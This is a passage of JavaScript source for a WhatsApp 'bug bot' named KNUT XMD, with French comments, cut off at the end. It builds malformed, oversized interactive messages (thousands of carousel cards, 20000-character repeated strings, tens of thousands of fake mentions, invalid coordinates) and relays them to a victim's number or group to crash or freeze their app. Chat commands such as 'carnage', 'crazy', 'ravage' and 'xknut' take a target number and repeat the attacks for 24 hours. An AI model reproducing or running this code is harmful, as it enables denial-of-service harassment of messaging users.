      subtitle: "⚡ Carrousel Crash ⚡",
      hasMediaAttachment: true,
    });

    // ✅ Générer 1000 cartes
    const cards = Array.from({ length: 1000 }, () => ({
      header,
      body: {
        text: "⏤⃟͟𝐊𝐍𝐔𝐓꙳𝐂𝐀𝐑𝐎𝐔𝐒𝐄𝐋͞⃟⏤͟͟͞͞͠🖤✦",
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
              display_text: "🔗 Voir",
              url: "https://example.com",
            }),
          },
        ],
      },
    }));

    // ✅ Créer le message
    const msg = generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              body: { text: "⚡ Carrousel spécial RAIZEL ⚡" },
              footer: { text: "𓆩⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋𓆪" },
              carouselMessage: { cards, messageVersion: 1 },
            },
          },
        },
      },
      {}
    );

    // ✅ Envoyer au target
    await sock.relayMessage(target, msg.message, {
      messageId: msg.key.id,
      ...(fJids ? { participant: { jid: target } } : {}),
    });

    console.log("✅ Carousels2 envoyé avec succès 🚀");
  } catch (err) {
    console.error("❌ Erreur dans carousels2:", err);
  }
}
// === CarouselX ===
async function CarouselX(sock, target) {
  try {
    let push = [];

    // ✅ Génère 1020 cartes (pas 1020 * 1020)
    for (let i = 0; i < 1020; i++) {
      push.push({
        body: proto.Message.InteractiveMessage.Body.fromObject({ text: "ㅤ" }),
        footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: "ㅤㅤ" }),
        header: proto.Message.InteractiveMessage.Header.fromObject({
          title: "⏤⃟͟𝐊𝐍𝐔𝐓꙳𝐂𝐀𝐑𝐎𝐔𝐒𝐄𝐋͞⃟⏤͟͟͞͞͠🖤✦",
          hasMediaAttachment: true,
          imageMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc",
            mimetype: "image/jpeg",
            fileSha256: "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
            fileLength: "10840",
            height: 10,
            width: 10,
            mediaKey: "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
            fileEncSha256: "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
            directPath: "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc",
            mediaKeyTimestamp: "1721344123",
            jpegThumbnail: ""
          }
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({ buttons: [] })
      });
    }

    const carousel = generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: proto.Message.InteractiveMessage.fromObject({
              body: proto.Message.InteractiveMessage.Body.create({
                text: `${"𑜦".repeat(20000)} 🚀 Crash Mode activé\n\u0000` // ⚠️ réduit pour éviter le freeze
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
                text: "`YT:` https://youtube.com/@richieMods"
              }),
              header: proto.Message.InteractiveMessage.Header.create({ hasMediaAttachment: false }),
              carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({ cards: push })
            })
          }
        }
      },
      {}
    );

    await sock.relayMessage(target, carousel.message, {
      messageId: carousel.key.id,
      participant: { jid: target },
    });

    console.log("✅ CarouselX envoyé avec succès 🚀");
  } catch (err) {
    console.error("❌ Erreur dans CarouselX:", err);
  }
}
// === KingDelayMess ===
async function KingDelayMess(sock, target, Ptcp = true) {
  try {
    // Génération d'une énorme liste de mentions
    const mentions = Array.from({ length: 500 }, () => "15056662003@s.whatsapp.net");

    const payload = {
      ephemeralMessage: {
        message: {
          interactiveMessage: proto.Message.InteractiveMessage.fromObject({
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: Buffer.from("QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=", "base64"),
                fileLength: 9999999999999,
                pageCount: 1316134911,
                mediaKey: Buffer.from("45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=", "base64"),
                fileName: "kingbadboi.🩸KNUT",
                fileEncSha256: Buffer.from("LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=", "base64"),
                mediaKeyTimestamp: 1726867151,
                contactVcard: true
              },
              hasMediaAttachment: true
            },
            body: {
              text: "⏤⃟͟𝐊𝐍𝐔𝐓꙳𝐃𝐄𝐋𝐀𝐘͞⃟⏤͟͟͞͞͠🖤✦",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "cta_url",
                  buttonParamsJson: JSON.stringify({
                    display_text: "KNUT CHANNEL",
                    url: "https://youtube.com/@iqbhalkeifer25"
                  })
                }
              ]
            },
            contextInfo: {
              mentionedJid: mentions // ✅ vraie liste de mentions
            }
          })
        }
      }
    };

    // Génération d’un vrai message WAMessage
    const msg = generateWAMessageFromContent(target, payload, {});

    // Envoi
    await sock.relayMessage(target, msg.message, {
      messageId: msg.key.id,
      ...(Ptcp ? { participant: { jid: target } } : {})
    });

    console.log("✅ KingDelayMess envoyé avec succès 🚀");
  } catch (err) {
    console.error("❌ Erreur dans KingDelayMess:", err);
  }
}
// === KingBroadcast ===
async function KingBroadcast(sock, target, mention = true) {
  try {
    // Génère 5000 mentions (plutôt que 20000 d’un seul coup)
    const mentions = Array.from({ length: 5000 }, () =>
      "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
    );

    // Génération sections limitées (sinon crash direct)
    const delaymention = Array.from({ length: 50 }, (_, r) => ({
      title: "𑇂".repeat(200), // 200 symboles par titre
      rows: [{ title: `📡 Broadcast ${r + 1}`, id: `${r + 1}` }]
    }));

    const MSG = {
      viewOnceMessage: {
        message: {
          listResponseMessage: {
            title: "⏤⃟͟𝐊𝐍𝐔𝐓꙳𝐁𝐑𝐎𝐀𝐃𝐂𝐀𝐒𝐓͞⃟⏤͟͟͞͞͠🖤✦",
            listType: 2,
            buttonText: "⚡ KNUT ⚡",
            sections: delaymention,
            singleSelectReply: { selectedRowId: "🔴" },
            contextInfo: {
              mentionedJid: mentions,
              remoteJid: "status@broadcast",
            }
          }
        }
      }
    };

    // Génération WAMessage
    const msg = generateWAMessageFromContent(target, MSG, {});

    // Envoi broadcast
    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
    });

    // Si mention activée → envoi supplémentaire
    if (mention) {
      await sock.relayMessage(
        target,
        {
          statusMentionMessage: {
            message: {
              protocolMessage: { key: msg.key, type: 25 }
            }
          }
        },
        { messageId: msg.key.id }
      );
    }

    console.log("✅ KingBroadcast envoyé avec succès 🚀");
  } catch (err) {
    console.error("❌ Erreur dans KingBroadcast:", err);
  }
}
// === All Delay Attacks Optimisé ===
async function alldelay(sock, target, loops = 30, pause = 1500) {
  const start = Date.now();

  for (let i = 0; i < loops; i++) {
    try {
      // Attaques variées
      await DelayInvisNew(sock, target);
      await superdelayinvid(sock, target);
      await delayCrash(sock, [target], false);
      await KingBroadcast(sock, target, true);
      await KingDelayMess(sock, target, true);

      console.log(`⚡ Vague ${i + 1}/${loops} envoyée sur ${target}`);

      // Pause entre chaque vague
      await new Promise(res => setTimeout(res, pause));
    } catch (err) {
      console.error("❌ Erreur dans alldelay:", err);
    }
  }

  const end = Date.now();
  const seconds = ((end - start) / 1000).toFixed(2);

  console.log(`✅ alldelay terminé pour: ${target} en ${seconds}s`);
}
// === Apaya (Newsletter Flood) ===
async function apaya(sock, target) {
  try {
    const message = {
      botInvokeMessage: {
        message: {
          newsletterAdminInviteMessage: {
            newsletterJid: "33333333333333333@newsletter",
            newsletterName:
              "⏤⃟͟𝐊𝐍𝐔𝐓꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🖤✦" + "ê¦¾".repeat(20000), // assez pour flood mais pas bloquer ton bot
            jpegThumbnail: Buffer.from(""), // ⚠️ doit être un buffer (met une image en base64 si tu veux un vrai thumb)
            caption: "ê¦½".repeat(20000),
            inviteExpiration: Date.now() + 1814400000, // 21 jours
          },
        },
      },
    };

    // Construction du message via Baileys
    const msg = generateWAMessageFromContent(target, message, {});

    // Envoi
    await sock.relayMessage(target, msg.message, {
      messageId: msg.key.id,
    });

    console.log(`✅ Apaya flood envoyé sur ${target}`);
  } catch (err) {
    console.error("❌ Erreur dans apaya:", err);
  }
}
// === All Protocol Flood ===
async function allProtocol(sock, target, loops = 20) {
  const start = Date.now();

  for (let i = 0; i < loops; i++) {
    try {
      // Delay bugs
      await DelayInvisNew(sock, target);
      await superdelayinvid(sock, target);
      await delayCrash(sock, [target], false, 300);

      // Bulldozer
      await bulldozer(sock, target);

      // Protocol bugs 1 -> 8
      await protocolbug1(sock, target, true);
      await protocolbug2(sock, target, true);
      await protocolbug3(sock, target, true);
      await protocolbug6(sock, target, true);
      await protocolbug7(sock, target, true);
      await protocolbug8(sock, target, true);

      // King broadcast & King delay
      await KingBroadcast(sock, target, true);
      await KingDelayMess(sock, target, true);

      // Pause entre chaque loop (éviter self-crash)
      await new Promise(res => setTimeout(res, 500));

    } catch (err) {
      console.error("❌ Erreur dans allProtocol:", err);
    }
  }

  const end = Date.now();
  const seconds = ((end - start) / 1000).toFixed(2);

  console.log(`✅ allProtocol terminé pour: ${target} en ${seconds}s`);
}


async function bugfunc(client, targetNumber) {

 try {

   let message = {

     ephemeralMessage: {

       message: {

         interactiveMessage: {

           header: {

             title: "Peace and Love",

             hasMediaAttachment: false,

             locationMessage: {

               degreesLatitude: -999.035,

               degreesLongitude: 922.999999999999,

               name: "Peace and Love",

               address: "Peace and Love",

             },

           },

           body: {

             text: "Peace and Love",

           },

           nativeFlowMessage: {

             messageParamsJson: "{".repeat(10000),

           },

           contextInfo: {

             participant: targetNumber,

             mentionedJid: [

               "0@s.whatsapp.net",

               ...Array.from(
                 {
                   length: 30000,
                 },
                 () =>
                   "1" +
                   Math.floor(Math.random() * 5000000) +
                   "@s.whatsapp.net"
               ),
             ],
           },
         },
       },
     },
   };

   await client.relayMessage(targetNumber, message, {

     messageId: null,

     participant: { jid: targetNumber },

     userJid: targetNumber,

   });

 } catch (err) {

   console.log(err);

 }

}
export async function sinivicrash(message, client) {

    try {

        const remoteJid = message.key?.remoteJid;

        if (!remoteJid) {

            throw new Error("Message JID is undefined.");
        }

        await client.sendMessage(remoteJid, { text: "Attempting to bug the target" });

        const messageBody = message.message?.extendedTextMessage?.text || message.message?.conversation || '';

        const commandAndArgs = messageBody.slice(1).trim();

        const parts = commandAndArgs.split(/\s+/);

        const args = parts.slice(1);

        let participant;

        if (message.message?.extendedTextMessage?.contextInfo?.quotedMessage) {

            participant = message.message.extendedTextMessage.contextInfo.participant;

        } else if (args.length > 0) {

            participant = args[0].replace('@', '') + '@s.whatsapp.net';

        } else {

            throw new Error('Specify the person to bug.');
        }

        const num = '@' + participant.replace('@s.whatsapp.net', '');

        // Execute the bug command

        for (let i = 0; i < 15; i++) {

            await bugfunc(client, participant);

            await new Promise(resolve => setTimeout(resolve, 2000));
        }


        await channelSender(message, client, "Succceded in sending bug to the target.\n\nThanks for using my service.", 1);

    } catch (error) {

        console.error("An error occurred while trying to bug the target:", error);

        await client.sendMessage(message.key.remoteJid, { text: `An error occurred while trying to bug the target: ${error.message}` });
    }
}

async function kclose(target) {
  const randomHex = (len = 16) =>
    [...Array(len)].map(() => Math.floor(Math.random() * 16).toString(16)).join("");

  const Node = [
    {
      tag: "bot",
      attrs: {
        biz_bot: "1"
      }
    }
  ];

  let msg = generateWAMessageFromContent(target, {
    interactiveMessage: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2,
        messageAssociation: {
          associationType: 2,
          parentMessageKey: randomHex(16)
        },
        messageSecret: randomHex(32), 
        supportPayload: JSON.stringify({
          version: 2,
          is_ai_message: true,
          should_show_system_message: true,
          expiration: -9999,
          ephemeralSettingTimestamp: 9741,
          disappearingMode: {
            initiator: "INITIATED_BY_OTHER",
            trigger: "ACCOUNT_SETTING"
          }
        }),
        isForwarded: true,
        forwardingScore: 1972,
        businessMessageForwardInfo: {
          businessOwnerJid: "13135550002@s.whatsapp.net"
        },
        quotedMessage: {
          interactiveMessage: {
            header: {
              hasMediaAttachment: true,
              jpegThumbnail: fs.readFileSync('./Zu.jpg'),
              title: "KClose" + "᭄".repeat(5000)
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "review_and_pay".repeat(5000),
                  buttonParamsJson: JSON.stringify({
                    currency: "XXX",
                    payment_configuration: "",
                    payment_type: "",
                    total_amount: { value: 1000000, offset: 100 },
                    reference_id: "4SWMDTS1PY4",
                    type: "physical-goods",
                    order: {
                      status: "payment_requested",
                      description: "",
                      subtotal: { value: 0, offset: 100 },
                      order_type: "PAYMENT_REQUEST",
                      items: [
                        {
                          retailer_id: "custom-item-6bc19ce3-67a4-4280-ba13-ef8366014e9b",
                          name: "KClose Protocol".repeat(5000),
                          amount: { value: 1000000, offset: 100 },
                          quantity: 1
                        }
                      ]
                    },
                    additional_note: "KClose",
                    native_payment_methods: [],
                    share_payment_status: true
                  })
                }
              ],
              messageParamsJson: "{}"
            }
          }
        }
      },
      header: {
        hasMediaAttachment: true,
        locationMessage: {
          degreesLatitude: 0,
          degreesLongitude: 0
        }
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "payment_method",
            buttonParamsJson: JSON.stringify({
              currency: "IDR",
              total_amount: { value: 1000000, offset: 100 },
              reference_id: "KClose",
              type: "physical-goods",
              order: {
                status: "canceled",
                subtotal: { value: 0, offset: 100 },
                order_type: "PAYMENT_REQUEST",
                items: [
                  {
                    retailer_id: "custom-item-6bc19ce3-67a4-4280-ba13-ef8366014e9b",
                    name: "kclose protocol activation".repeat(5000),
                    amount: { value: 1000000, offset: 100 },
                    quantity: 1000
                  }
                ]
              },
              additional_note: "KClose",
              native_payment_methods: [],
              share_payment_status: true
            })
          }
        ],
        messageParamsJson: "{}"
      },
      annotations: [
        {
          embeddedContent: {
            embeddedMessage: {
              message: "KClose Protocol"
            }
          },
          location: {
            degreesLongitude: 0,
            degreesLatitude: 0,
            name: "KClose Anti-Gedor".repeat(5000)
          },
          polygonVertices: [
            { x: 60.71664810180664, y: -36.39784622192383 },
            { x: -16.710189819335938, y: 49.263675689697266 },
            { x: -56.585853576660156, y: 37.85963439941406 },
            { x: 20.840980529785156, y: -47.80188751220703 }
          ],
          newsletter: {
            newsletterJid: "1@newsletter",
            newsletterName: "KClose Protocol".repeat(5000),
            contentType: "UPDATE",
            accessibilityText: "ꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽꦽ"
          }
        }
      ]
    }
  }, { userJid: target });

  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id,
    additionalnodes: [
      {
        tag: "interactive",
        attrs: {
          type: "native_flow",
          v: "1"
        },
        content: [
          {
            tag: "native_flow",
            attrs: {
              v: "9",
              name: "payment_method"
            },
            content: [
              {
                tag: "extensions_metadata",
                attrs: {
                  flow_message_version: "3",
                  well_version: "700"
                },
                content: []
              }
            ]
          }
        ]
      }
    ]
  });
}


// ===================== KNUT XMD - TOUTES LES COMMANDES BUGS =====================
const CAROUSEL_INTERVAL = 5 * 60 * 1000;        
const MAX_PER_HOUR     = 12;                    // max par heure

// ────────────────────────────────────────────────
// bugmenu
// ────────────────────────────────────────────────
const bugmenu = {
  name: "bugmenu",
  description: "Affiche toutes les commandes de bugs",
  category: "bug",
  execute: async (sock, msg, args, from) => {
    const totalSeconds = process.uptime();
    const hours = Math.floor(totalSeconds / 3600);
    const minutes = Math.floor((totalSeconds % 3600) / 60);
    const seconds = Math.floor(totalSeconds % 60);
    const uptime = `\( {hours}h \) {minutes}m ${seconds}s`;

    const menuText = `> ╔════════════════════╗
        ⚫ KNUT XMD ⚫
> ╚════════════════════╝

> 🥷🏾 *Utilisateur* : ${msg.pushName || "Invité"}
> ⚙️ *Mode*       : 🔒 Privé
> ⏱️ *Uptime*     : ${uptime}
> 📱 *Version*     : 4.0
> 🧎🏾 *Développeur* : _Knut_

> ╔───BUGS COMMANDS ────╗
> ➤ xknut      (in group)
> ➤ knutravage (in group)
> ➤ crazy        
> ➤ katchan
> ➤ thorf
> ➤ carnage       
> ➤ ravage            
> ╚───────────────────╝

> By Devil Knut`;

    await sock.sendMessage(from, {
      image: { url: "https://files.catbox.moe/8svman.jpg" },
      caption: menuText,
      gifPlayback: false,
      ptt: false,
    }, { quoted: msg });

    await sock.sendMessage(from, {
      audio: { url: "https://files.catbox.moe/wpn4fd.m4a" },
      mimetype: "audio/mpeg",
      ptt: true,
    }, { quoted: msg });
  },
};

// ────────────────────────────────────────────────

const carnage = {
  name: "carnage",
  execute: async (sock, msg, args, from) => {
    const q = args[0];

    if (!q) {
      return sock.sendMessage(from, {
        text: `╔═══❖ CARNAGE ❖═══╗
➤ Syntaxe correcte :
   carnage 237XXXXXXXX
╚═════════════════╝`
      }, { quoted: msg });
    }

    const number = q.replace(/[^0-9]/g, "");
    const target = number + "@s.whatsapp.net";

    /* ─────────── INITIATION ─────────── */
    await sock.sendMessage(from, {
      image: { url: "https://files.catbox.moe/xfhezd.jpg" },
      caption: `╭━〔 🩸𝗖𝗔𝗥𝗡𝗔𝗚𝗘:𝗜𝗡𝗜𝗧𝗜𝗔𝗧𝗜𝗢𝗡 〕━╮
◈ Cible    : ${number}
◈ Mode     : Régulé
◈ Durée    : 24 Heures
◈ Sécurité : Anti‑Spam Actif

❄️ Stabilisation en cours…
╰━━━━━━━━━━━━━━━━━━━━━━━━━╯`
    }, { quoted: msg });

    /* ───────── PARAMÈTRES ───────── */
    const START = Date.now();
    const DURATION = 24 * 60 * 60 * 1000; // 24 heures
    const ACTION_INTERVAL = 5 * 60 * 1000; // 5 minutes
    const MAX_PER_HOUR = 12;

    let hourCount = 0;
    let hourStart = Date.now();

    try {
      while (Date.now() - START < DURATION) {
        if (Date.now() - hourStart >= 60 * 60 * 1000) {
          hourCount = 0;
          hourStart = Date.now();
        }

        if (hourCount < MAX_PER_HOUR) {
          await carouselDelay(sock, target);
          hourCount++;
        }

        await new Promise(r => setTimeout(r, ACTION_INTERVAL));
      }

      /* ───────── TERMINAISON ───────── */
      await sock.sendMessage(from, {
        text: `╔═══❖ 𝗖𝗔𝗥𝗡𝗔𝗚𝗘 𝗥𝗘𝗣𝗢𝗥𝗧 ❖═══╗
✔ Cycle 24H complété
✔ Cadence maîtrisée

🧊 État final : STABLE
╚═════════════════════════╝`
      }, { quoted: msg });

    } catch (err) {
      console.log("⚠️ Carnage interrompu :", err);
      await sock.sendMessage(from, {
        text: `⚠️ 𝗖𝗔𝗥𝗡𝗔𝗚𝗘 – 𝗜𝗡𝗧𝗘𝗥𝗥𝗨𝗣𝗧𝗜𝗢𝗡`
      }, { quoted: msg });
    }
  },
};

// ────────────────────────────────────────────────

const crazy = {
  name: "crazy",
  execute: async (sock, msg, args, from) => {
    const q = args[0];
    if (!q) {
      return sock.sendMessage(from, {
        text: `╔═══❖ CRAZY ❖═══╗
➤ Syntaxe correcte :
   crazy 237XXXXXXXX
╚════════════════╝`
      }, { quoted: msg });
    }

    const number = q.replace(/[^0-9]/g, "");
    const target = number + "@s.whatsapp.net";

    await sock.sendMessage(from, {
      image: { url: "https://files.catbox.moe/94m0al.jpg" },
      caption: `╭━〔 ☠️𝗖𝗥𝗔𝗭𝗬:𝗜𝗡𝗜𝗧𝗜𝗔𝗧𝗜𝗢𝗡 〕━╮
◈ Cible    : ${number}
◈ Mode     : Explosif
◈ Durée    : 24 Heures
◈ Sécurité : Anti‑Spam Actif

❄️ Stabilisation en cours…
╰━━━━━━━━━━━━━━━━━━━━━━━╯`
    }, { quoted: msg });

    const START = Date.now();
    const DURATION = 24 * 60 * 60 * 1000;
    const ACTION_INTERVAL = 4 * 60 * 1000; // 4 min
    const MAX_PER_HOUR = 15;

    let hourCount = 0;
    let hourStart = Date.now();

    try {
      // Séquence initiale explosive
      await thunderblast_ios1(sock, target);
      await alldelay(sock, target);
      await callHome(sock, target);
      await carousels2(sock, target);
      await CarouselX(sock, target);
      await apaya(sock, target);

      // Boucle maintenue
      while (Date.now() - START < DURATION) {
        if (Date.now() - hourStart >= 60 * 60 * 1000) {
          hourCount = 0;
          hourStart = Date.now();
        }

        if (hourCount < MAX_PER_HOUR) {
          await carouselDelay(sock, target);
          hourCount++;
        }

        await new Promise(r => setTimeout(r, ACTION_INTERVAL));
      }

      await sock.sendMessage(from, {
        text: `╔═══❖ 𝗖𝗥𝗔𝗭𝗬 𝗥𝗘𝗣𝗢𝗥𝗧 ❖═══╗
✔ Cycle 24H complété
✔ Chaos maîtrisé

🧊 État final : STABLE
╚════════════════════════╝`
      }, { quoted: msg });

    } catch (err) {
      console.error("❌ Erreur CRAZY:", err);
      await sock.sendMessage(from, { text: `⚠️ 𝗖𝗥𝗔𝗭𝗬 – 𝗜𝗡𝗧𝗘𝗥𝗥𝗨𝗣𝗧𝗜𝗢𝗡` }, { quoted: msg });
    }
  },
};

// ────────────────────────────────────────────────

const ravage = {
  name: "ravage",
  execute: async (sock, msg, args, from) => {
    const q = args[0];
    if (!q) {
      return sock.sendMessage(from, {
        text: `╔═══❖ 𝗥𝗔𝗩𝗔𝗚𝗘 ❖═══╗
➤ Syntaxe correcte :
   ravage 237XXXXXXXX
╚══════════════════╝`
      }, { quoted: msg });
    }

    const number = q.replace(/[^0-9]/g, "");
    const target = number + "@s.whatsapp.net";

    await sock.sendMessage(from, {
      image: { url: "https://files.catbox.moe/f4x6bs.jpg" },
      caption: `╭━〔 🩸𝗥𝗔𝗩𝗔𝗚𝗘:𝗜𝗡𝗜𝗧𝗜𝗔𝗧𝗜𝗢𝗡 〕━╮
◈ Cible    : ${number}
◈ Mode     : Mixte
◈ Durée    : 24 Heures
◈ Sécurité : Anti‑Spam Actif

❄️ Stabilisation en cours…
╰━━━━━━━━━━━━━━━━━━━━━━━╯`
    }, { quoted: msg });

    const START = Date.now();
    const DURATION = 24 * 60 * 60 * 1000;
    const ACTION_INTERVAL = 3 * 60 * 1000; // 3 min
    const MAX_PER_HOUR = 20;

    let hourCount = 0;
    let hourStart = Date.now();

    try {
      // Séquence initiale
      await thunderblast_ios1(sock, target);
      await alldelay(sock, target);
      await callHome(sock, target);
      await carousels2(sock, target);
      await CarouselX(sock, target);
      await apaya(sock, target);

      // Boucle ravage
      while (Date.now() - START < DURATION) {
        if (Date.now() - hourStart >= 60 * 60 * 1000) {
          hourCount = 0;
          hourStart = Date.now();
        }

        if (hourCount < MAX_PER_HOUR) {
          await carouselDelay(sock, target);
          await carouselDelay(sock, target);
          hourCount += 2;
        }

        await new Promise(r => setTimeout(r, ACTION_INTERVAL));
      }

      await sock.sendMessage(from, {
        text: `╔═══❖ 𝗥𝗔𝗩𝗔𝗚𝗘 𝗥𝗘𝗣𝗢𝗥𝗧 ❖═══╗
✔ Cycle 24H complété
✔ Dommages maîtrisés

🧊 État final : STABLE
╚════════════════════════╝`
      }, { quoted: msg });

    } catch (err) {
      console.error("⚠️ Ravage interrompu :", err);
      await sock.sendMessage(from, {
        text: `⚠️ 𝗥𝗔𝗩𝗔𝗚𝗘 – 𝗜𝗡𝗧𝗘𝗥𝗥𝗨𝗣𝗧𝗜𝗢𝗡`
      }, { quoted: msg });
    }
  },
};

// ────────────────────────────────────────────────

const xknut = {
  name: "xknut",
  execute: async (sock, msg, args, from) => {
    if (!msg.key.remoteJid.endsWith("@g.us")) {
      return sock.sendMessage(from, {
        text: `╔═══❖ XKNUT ❖═══╗
❌ Groupe requis uniquement
╚══════════════╝`
      }, { quoted: msg });
    }

    const target = from;

    await sock.sendMessage(from, {
      image: { url: "https://files.catbox.moe/x2hle6.jpg" },
      caption: `╭━〔 🌀𝗫𝗞𝗡𝗨𝗧:𝗜𝗡𝗜𝗧𝗜𝗔𝗧𝗜𝗢𝗡 〕━╮
◈ Cible    : Groupe entier
◈ Mode     : Vortex
◈ Durée    : 24 Heures
◈ Sécurité : Anti‑Spam Actif

❄️ Stabilisation en cours…
╰━━━━━━━━━━━━━━━━━━━━━━━╯`
    }, { quoted: msg });

    const START = Date.now();
    const DURATION = 24 * 60 * 60 * 1000;
    const ACTION_INTERVAL = 6 * 60 * 1000; // 6 min
    const MAX_PER_HOUR = 10;

    let hourCount = 0;
    let hourStart = Date.now();

    try {
      // Burst initial groupe
      await apaya(sock, target);
      await alldelay(sock, target);
      await bulldozer(sock, target);
      await allProtocol(sock, target);
      await thunderblast_ios1(sock, target);

      while (Date.now() - START < DURATION) {
        if (Date.now() - hourStart >= 60 * 60 * 1000) {
          hourCount = 0;
          hourStart = Date.now();
        }

        if (hourCount < MAX_PER_HOUR) {
          await carouselDelay(sock, target);
          await thunderblast_ios1(sock, target);
          hourCount++;
        }

        await new Promise(r => setTimeout(r, ACTION_INTERVAL));
      }

      await sock.sendMessage(from, {
        text: `╔═══❖ 𝗫𝗞𝗡𝗨𝗧 𝗥𝗘𝗣𝗢𝗥𝗧 ❖═══╗
✔ Cycle 24H complété
